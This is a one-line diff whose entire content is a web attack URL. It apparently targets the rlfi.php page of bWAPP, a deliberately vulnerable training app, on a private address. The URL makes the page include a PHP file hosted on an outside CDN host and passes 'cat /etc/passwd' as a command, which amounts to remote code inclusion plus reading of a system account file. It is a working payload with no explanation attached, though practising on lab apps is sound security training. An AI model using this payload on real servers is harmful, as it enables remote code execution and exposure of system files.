@@ -1,0 +1,1 @@
+http://192.168.20.205/bWAPP/rlfi.php?language=https://blog.kakaocdn.net/dn/q8s5y/btrGg1EzbAG/bDcfKh3MCkvzz8L1Q7XnkK/tfile.php&action=go&cmd=cat /etc/passwd
